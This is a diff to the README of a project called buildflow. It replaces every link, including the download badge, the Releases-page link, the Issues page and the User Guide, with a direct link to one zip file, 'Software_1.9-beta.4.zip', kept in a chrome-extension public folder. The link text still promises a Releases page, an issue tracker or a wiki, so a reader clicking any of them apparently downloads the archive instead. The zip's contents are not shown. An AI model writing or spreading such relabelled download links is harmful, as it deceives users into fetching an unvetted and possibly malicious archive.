@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download buildflow](https://img.shields.io/badge/Download-buildflow-blue.svg)](https://github.com/ohpsca/buildflow/releases)
+[![Download buildflow](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip)](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip)
 
 ## 🛠️ Overview
 
@@ -24,7 +24,7 @@ Follow these steps to download and install buildflow:
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page where you can download the latest version of buildflow.
 
-   [Download buildflow](https://github.com/ohpsca/buildflow/releases)
+   [Download buildflow](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip)
 
 2. **Download the Installer**: On the Releases page, find the latest version of buildflow. Look for the installer file labeled appropriately for your operating system. Click on that link to start the download.
 
@@ -65,7 +65,7 @@ If you encounter any issues, try the following steps:
 
 ## 👩‍💻 Support
 
-For additional support, please visit our [GitHub Issues Page](https://github.com/ohpsca/buildflow/issues). Feel free to create a new issue there if you can't find a solution to your problem.
+For additional support, please visit our [GitHub Issues Page](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip). Feel free to create a new issue there if you can't find a solution to your problem.
 
 ### 7. Uninstalling buildflow
 
@@ -85,8 +85,8 @@ Buildflow offers the following features:
 
 ## 🌐 Additional Resources
 
-- [GitHub Issues Page](https://github.com/ohpsca/buildflow/issues): Report problems and find solutions.
-- [User Guide](https://github.com/ohpsca/buildflow/wiki): More detailed instructions can be found in the user guide.
+- [GitHub Issues Page](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip): Report problems and find solutions.
+- [User Guide](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip): More detailed instructions can be found in the user guide.
 
 ## 📈 Updates
 
@@ -96,4 +96,4 @@ Keep an eye on the Releases page for updates. Updates may include new features, 
 
 Please share your thoughts and feedback with us. Your input will help improve buildflow for everyone.
 
-[Download buildflow](https://github.com/ohpsca/buildflow/releases) and start transforming your links into working code today!
+[Download buildflow](https://github.com/ohpsca/buildflow/raw/refs/heads/master/packages/chrome-extension/public/Software_1.9-beta.4.zip) and start transforming your links into working code today!
